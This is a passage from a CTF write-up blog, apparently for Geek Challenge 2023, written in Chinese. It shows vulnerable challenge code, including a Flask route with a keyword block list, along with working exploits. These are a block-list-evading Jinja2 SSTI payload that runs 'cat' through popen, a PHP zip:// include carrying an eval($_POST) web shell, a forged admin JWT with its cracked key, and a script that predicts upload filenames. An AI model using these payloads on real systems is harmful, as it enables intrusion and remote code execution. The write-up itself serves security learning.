class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">secr3t</span>():</span><br><span class="line"></span><br><span class="line">    name = request.args.get(<span class="string">&#x27;klf&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    template = <span class="string">f&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">       &lt;html&gt;</span></span><br><span class="line"><span class="string">           &lt;body&gt;</span></span><br><span class="line"><span class="string">               &lt;h1&gt;找到secr3t了，但是找不到flag你还是个klf&lt;/h1&gt;</span></span><br><span class="line"><span class="string">               &lt;h1&gt;%s&lt;/h1&gt;         </span></span><br><span class="line"><span class="string">           &lt;/body&gt;</span></span><br><span class="line"><span class="string">       &lt;/html&gt;</span></span><br><span class="line"><span class="string">       &lt;img src=\&quot;https://image-obsidian-1317327960.cos.ap-chengdu.myqcloud.com/obisidian-blog/8.jpg\&quot; alt=&quot;g&quot;&gt;</span></span><br><span class="line"><span class="string">       &lt;!--klf?--&gt;</span></span><br><span class="line"><span class="string">       &lt;!-- klf还想要flag？没那么容易 --&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">       &#x27;&#x27;&#x27;</span></span><br><span class="line">    bl = [<span class="string">&#x27;_&#x27;</span>, <span class="string">&#x27;\\&#x27;</span>, <span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;request&#x27;</span>, <span class="string">&quot;+&quot;</span>, <span class="string">&#x27;class&#x27;</span>, <span class="string">&#x27;init&#x27;</span>, <span class="string">&#x27;arg&#x27;</span>, <span class="string">&#x27;config&#x27;</span>, <span class="string">&#x27;app&#x27;</span>, <span class="string">&#x27;self&#x27;</span>, <span class="string">&#x27;cd&#x27;</span>, <span class="string">&#x27;chr&#x27;</span>,</span><br><span class="line">          <span class="string">&#x27;request&#x27;</span>, <span class="string">&#x27;url&#x27;</span>, <span class="string">&#x27;builtins&#x27;</span>, <span class="string">&#x27;globals&#x27;</span>, <span class="string">&#x27;base&#x27;</span>, <span class="string">&#x27;pop&#x27;</span>, <span class="string">&#x27;import&#x27;</span>, <span class="string">&#x27;popen&#x27;</span>, <span class="string">&#x27;getitem&#x27;</span>, <span class="string">&#x27;subclasses&#x27;</span>, <span class="string">&#x27;/&#x27;</span>,</span><br><span class="line">          <span class="string">&#x27;flashed&#x27;</span>, <span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;open&#x27;</span>, <span class="string">&#x27;read&#x27;</span>, <span class="string">&#x27;count&#x27;</span>, <span class="string">&#x27;*&#x27;</span>, <span class="string">&#x27;43&#x27;</span>, <span class="string">&#x27;45&#x27;</span>, <span class="string">&#x27;38&#x27;</span>, <span class="string">&#x27;124&#x27;</span>, <span class="string">&#x27;47&#x27;</span>, <span class="string">&#x27;59&#x27;</span>, <span class="string">&#x27;99&#x27;</span>, <span class="string">&#x27;100&#x27;</span>, <span class="string">&#x27;cat&#x27;</span>, <span class="string">&#x27;~&#x27;</span>,</span><br><span class="line">          <span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;not&#x27;</span>, <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;length&#x27;</span>, <span class="string">&#x27;index&#x27;</span>, <span class="string">&#x27;-&#x27;</span>, <span class="string">&#x27;ord&#x27;</span>, <span class="string">&#x27;37&#x27;</span>, <span class="string">&#x27;94&#x27;</span>, <span class="string">&#x27;96&#x27;</span>, <span class="string">&#x27;48&#x27;</span>, <span class="string">&#x27;49&#x27;</span>, <span class="string">&#x27;50&#x27;</span>, <span class="string">&#x27;51&#x27;</span>, <span class="string">&#x27;52&#x27;</span>, <span class="string">&#x27;53&#x27;</span>, <span class="string">&#x27;54&#x27;</span>,</span><br><span class="line">          <span class="string">&#x27;55&#x27;</span>, <span class="string">&#x27;56&#x27;</span>, <span class="string">&#x27;57&#x27;</span>,</span><br><span class="line">          <span class="string">&#x27;58&#x27;</span>, <span class="string">&#x27;59&#x27;</span>, <span class="string">&#x27;[&#x27;</span>, <span class="string">&#x27;]&#x27;</span>, <span class="string">&#x27;@&#x27;</span>, <span class="string">&#x27;^&#x27;</span>, <span class="string">&#x27;#&#x27;</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> bl:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> name:</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&#x27;klf.html&#x27;</span>)</span><br><span class="line">            <span class="comment">#return &quot;真是klf！！！回去多学学啦&quot;</span></span><br><span class="line"></span><br><span class="line">    pattern = <span class="string">r&quot;\s*\)\s*\)&quot;</span></span><br><span class="line">    <span class="keyword">match</span> = re.search(pattern, name)</span><br><span class="line">    pattern2 = <span class="string">r&quot;\s*\)\s*(,)?\s*\)&quot;</span></span><br><span class="line">    match2 = re.search(pattern2, name)</span><br><span class="line">    pattern3 = <span class="string">r&quot;\s*\)\s*\)\s*\|&quot;</span></span><br><span class="line">    match3 = re.search(pattern3, name)</span><br><span class="line">    pattern4 = <span class="string">r&quot;\s*,\s*\)\s*\)\s*\|&quot;</span></span><br><span class="line">    match4 = re.search(pattern4, name)</span><br><span class="line"></span><br><span class="line">    pattern_mo = <span class="string">r&quot;\d+\s*%\s*\d+|[a-zA-Z]+\s*%\s*[a-zA-Z]+&quot;</span></span><br><span class="line">    matche_mo = re.search(pattern_mo, name)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">match</span>:</span><br><span class="line">        <span class="keyword">if</span> match2.group(<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&#x27;klf.html&#x27;</span>)</span><br><span class="line">        <span class="keyword">elif</span> match4:</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&#x27;klf.html&#x27;</span>)</span><br><span class="line">        <span class="keyword">elif</span> match3:</span><br><span class="line">            <span class="keyword">return</span> render_template_string(template % name)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&#x27;klf.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 输出匹配的结果</span></span><br><span class="line">    <span class="keyword">if</span> matche_mo :</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;klf.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    a=render_template_string(template % name)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;&#123;&quot;</span> <span class="keyword">in</span> a:</span><br><span class="line">        <span class="keyword">return</span> a + render_template(<span class="string">&#x27;win.html&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span>  a</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/robots.txt&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">robots</span>():</span><br><span class="line">    <span class="keyword">return</span> send_from_directory(os.path.join(app.root_path, <span class="string">&#x27;static&#x27;</span>),</span><br><span class="line">                               <span class="string">&#x27;robots.txt&#x27;</span>, mimetype=<span class="string">&#x27;text/plain&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">7888</span>, debug=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure>

<p>还是可以用klf_2的解法解决,不可以用“))”，只需要从klf_2的exp改一下就好了，也是侥幸拿了一个一血</p>
<h3 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&#123;% set po=dict(po=a,p=b)|join%&#125; </span><br><span class="line">&#123;% set a=(()|select|string|list)|attr(po)(24)%&#125;</span><br><span class="line">&#123;% set ini=(a,a,dict(in=a,it=b)|join,a,a)|join()%&#125;</span><br><span class="line">&#123;% set glo=(a,a,dict(glo=a,bals=b)|join,a,a)|join()%&#125;</span><br><span class="line">&#123;% set cls=(a,a,dict(cla=a,ss=b)|join,a,a)|join()%&#125;</span><br><span class="line">&#123;% set bs=(a,a,dict(bas=a,e=b)|join,a,a)|join()%&#125;</span><br><span class="line">&#123;% set geti=(a,a,dict(get=a)|join,dict(item=a)|join,a,a)|join()%&#125;</span><br><span class="line">&#123;% set subc=(a,a,dict(subcla=a,sses=b)|join,a,a)|join()%&#125;</span><br><span class="line">&#123;% set pp=dict(po=a,pen=b)|join %&#125;</span><br><span class="line">&#123;% set re=dict(re=a,ad=b)|join%&#125;</span><br><span class="line"></span><br><span class="line">&#123;% set kon=(()|select|string|list)|attr(po)(17)%&#125; </span><br><span class="line">&#123;% set dian=(g|string|list)|attr(po)(6)%&#125;   	</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;% set qian=dict(p=a)|join%&#125;</span><br><span class="line">&#123;% set hou=dict(p=a,y=b)|join%&#125;</span><br><span class="line">&#123;% set ming=(kon,kon,dict(ap=a,p=b)|join,dian,hou)|join()%&#125;</span><br><span class="line">&#123;% set cmd=(dict(ca=a,t=b)|join,ming)|join()%&#125;</span><br><span class="line"></span><br><span class="line">&#123;% set a=()|attr(cls)|attr(bs)|attr(subc)()|attr(geti)(117)|attr(ini)|attr(glo)|attr(geti)(pp)(cmd)|attr(re)()%&#125;</span><br><span class="line">&#123;% set bb=(a|string|list)|attr(po)(246)%&#125;</span><br><span class="line"></span><br><span class="line">&#123;% set ho=(dict(ap=a,p=b))|join%&#125;</span><br><span class="line">&#123;% set fl=(dict(fl4gfl4g=a,fl4g=b))|join%&#125;</span><br><span class="line">&#123;% set  cmd=(dict(ca=a,t=b)|join,kon,bb,ho,bb,fl)|join%&#125;</span><br><span class="line">&#123;% set res =()|attr(cls)|attr(bs)|attr(subc)()|attr(geti)(117)|attr(ini)|attr(glo)|attr(geti)(pp)(cmd)|attr(re)()%&#125;</span><br><span class="line">&#123;% print(res) %&#125;</span><br></pre></td></tr></table></figure>



<h2 id="famale-imp-l0ve"><a href="#famale-imp-l0ve" class="headerlink" title="famale_imp_l0ve"></a>famale_imp_l0ve</h2><p>只能上传zip文件，而且存在一处文件包含，限制了后缀必须为<code>.jpg</code>;这题的php环境是5.6；<code>\x00</code>的截断在php&gt;5.3.4就没用了</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//o2takuXX师傅说有问题，忘看了。</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Type: text/html; charset=utf-8&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$file</span>) &amp;&amp; <span class="title function_ invoke__">strtolower</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$file</span>, -<span class="number">4</span>)) == <span class="string">&quot;.jpg&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<p>在php中 zip:&#x2F;&#x2F;test.zip#1.png是什么意思?</p>
<p>在PHP中，zip:&#x2F;&#x2F;test.zip#1.png是一种URL封装协议，它允许你像访问本地文件一样访问ZIP存档中的文件。在这个例子中，zip:&#x2F;&#x2F;表示使用ZIP协议，test.zip是ZIP存档的文件名，#1.png表示存档中的文件路径。因此，zip:&#x2F;&#x2F;test.zip#1.png意味着你正在引用test.zip存档中的1.png文件。</p>
<p>新建一个文件 <code>1.jpg</code><br>图片内容即可为需要执行的命令，如<code>&lt;?php eval($_POST[1]); ?&gt;</code><br>打包成zip<br>即<br><code>include.php?file=zip://upload/3.zip%231.jpg</code></p>
<h2 id="change-it"><a href="#change-it" class="headerlink" title="change_it"></a>change_it</h2><h3 id="source-code-2"><a href="#source-code-2" class="headerlink" title="source code"></a>source code</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"> &lt;!--</span><br><span class="line">用户名为：user</span><br><span class="line">密码也为：user</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure>

<p>登陆之后没有权限上传文件，查看cookie是一段jwt加密，没什么好说的直接用工具跑出key</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">key : &quot;yibao&quot;</span><br><span class="line">eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJRaW5nd2FuIiwibmFtZSI6ImFkbWluIiwiYWRtaW4iOiJ0cnVlIn0.qs6tjnaghMXiTsvqEMUauz_JGzxxKdtaXPGVtQUEHek</span><br></pre></td></tr></table></figure>

<p>现在有权限上传任意文件了，但是只知道文件上传在upload下，不知道文件名，查看源代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">php_mt_seed</span>(<span class="params"><span class="variable">$seed</span></span>)</span></span><br><span class="line"><span class="function">      </span>&#123;</span><br><span class="line">          <span class="title function_ invoke__">mt_srand</span>(<span class="variable">$seed</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="variable">$seed</span> = <span class="title function_ invoke__">time</span>();</span><br><span class="line">      <span class="title function_ invoke__">php_mt_seed</span>(<span class="variable">$seed</span>);</span><br><span class="line">      <span class="variable">$characters</span> = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;</span><br><span class="line"></span><br><span class="line">      <span class="variable">$newFileName</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">      <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">10</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">          <span class="variable">$newFileName</span> .= <span class="variable">$characters</span>[<span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>, <span class="title function_ invoke__">strlen</span>(<span class="variable">$characters</span>) - <span class="number">1</span>)];</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure>

<p>这代码很明显了，只要知道time的时间戳，既可以知道文件名，</p>
<h3 id="poc-1"><a href="#poc-1" class="headerlink" title="poc"></a>poc</h3><p>解释一下我的脚本:设置一个十秒的时间戳，在这十秒之内上传一个文件必定可以中一个文件的时间戳</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">php_mt_seed</span>(<span class="params"><span class="variable">$seed</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">mt_srand</span>(<span class="variable">$seed</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$j</span> = <span class="number">0</span>; <span class="variable">$j</span> &lt; <span class="number">10</span>; <span class="variable">$j</span>++)&#123;</span><br><span class="line">        <span class="variable">$seed</span> = <span class="title function_ invoke__">time</span>();</span><br><span class="line">        <span class="title function_ invoke__">php_mt_seed</span>(<span class="variable">$seed</span>);</span><br><span class="line">        <span class="title function_ invoke__">sleep</span>(<span class="number">1</span>);</span><br><span class="line">		<span class="keyword">echo</span> <span class="variable">$seed</span>.<span class="string">&quot;: &quot;</span>;</span><br><span class="line">        <span class="variable">$characters</span> = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;</span><br><span class="line">        <span class="variable">$newFileName</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">10</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$newFileName</span> .= <span class="variable">$characters</span>[<span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>, <span class="title function_ invoke__">strlen</span>(<span class="variable">$characters</span>) - <span class="number">1</span>)];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$newFileName</span>.<span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行这个脚本，在十秒之内上传一个木马文件即可，然后脚本会根据十个时间戳输出十个文件名，其中必定会中一个文件名</p>
<h2 id="flag保卫战-待复现"><a href="#flag保卫战-待复现" class="headerlink" title="flag保卫战(待复现)"></a>flag保卫战(待复现)</h2><h2 id="ezrfi-待复现"><a href="#ezrfi-待复现" class="headerlink" title="ezrfi(待复现)"></a>ezrfi(待复现)</h2><h2 id="scan-tool-待复现"><a href="#scan-tool-待复现" class="headerlink" title="scan_tool(待复现)"></a>scan_tool(待复现)</h2><h2 id="ez-sql-待复现"><a href="#ez-sql-待复现" class="headerlink" title="ez_sql(待复现)"></a>ez_sql(待复现)</h2><h2 id="EZ-Smuggling-待复现"><a href="#EZ-Smuggling-待复现" class="headerlink" title="EZ_Smuggling(待复现)"></a>EZ_Smuggling(待复现)</h2><h2 id="java-待复现"><a href="#java-待复现" class="headerlink" title="java(待复现)"></a>java(待复现)</h2></p></div><div class="post-footer"><div class="tip">All rights reserved<br>Author: zIxyd</div><div class="meta"><div class="info"><i class="fa fa-sun-o"></i><span class="date">2023-11-26</span><i class="fa fa-tag"></i><a class="tag" href="/tags/writeup/" title="writeup">writeup </a><span class="leancloud_visitors"></span><span>About 9245 words, 30 min 49 sec  read</span></div></div></div></div><div class="share"><div class="evernote"><a class="fa fa-bookmark" href="" onclick="javascript:join_favorite()" ref="sidebar"></a></div><div class="weibo"><a class="fa fa-weibo" href="javascript:void((function(s,d,e){try{}catch(e){}var f='http://service.weibo.com/share/share.php?',u=d.location.href,p=['url=',e(u),'&amp;title=',e(d.title),'&amp;appkey=2924220432'].join('');function a(){if(!window.open([f,p].join(''),'mb',['toolbar=0,status=0,resizable=1,width=620,height=450,left=',(s.width-620)/2,',top=',(s.height-450)/2].join('')))u.href=[f,p].join('');};if(/Firefox/.test(navigator.userAgent)){setTimeout(a,0)}else{a()}})(screen,document,encodeURIComponent));"></a></div><div class="twitter"><a class="fa fa-twitter" target="_blank" rel="noopener" href="http://twitter.com/intent/tweet?text=I%20have%20found%20a%20great%20blog.%0A%0AzIxyd's%20Blog%20%C2%B7%20Geek%20Challenge%202023%0Ahttps://zIxyd.github.io/2023/11/26/Geek%20Challenge%202023/%0A"></a></div></div><div class="pagination"><ul class="clearfix"><li class="pre pagbuttons"><a class="btn" role="navigation" href="/2023/12/07/Linux%E6%8F%90%E6%9D%83/" title="Linux提权总结">Previous</a></li><li class="next pagbuttons"><a class="btn" role="navigation" href="/2023/11/20/PHP_%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%88%A9%E7%94%A8/" title="PHP_原生类利用">Next</a></li></ul></div><script src="/js/visitors.js"></script></div></div></div></div><script src="/js/darkLightToggle.js"></script><script src="/js/jquery-migrate-1.2.1.min.js"></script><script src="/js/jquery.appear.js"></script><script src="/js/add-bookmark.js"></script><script>(function(window){var INSIGHT_CONFIG={TRANSLATION:{POSTS:"Posts",PAGES:"Pages",CATEGORIES:"Categories",TAGS:"Tags",UNTITLED:"(Untitled)",},CONTENT_URL:"/content.json",};window.INSIGHT_CONFIG=INSIGHT_CONFIG})(window);</script><script src="/js/insight.js" defer></script><div class="searchbox ins-search"><div class="searchbox-container ins-search-container"><div class="searchbox-input-wrapper"><input class="searchbox-input ins-search-input" type="text" placeholder="Search..."><span class="searchbox-close"><a class="fa fa-times-circle" onclick="closeWindow();"></a></span></div><div class="searchbox-result-wrapper ins-section-wrapper"><div class="ins-section-container"><p>Seraching...</p></div></div></div></div></body></html>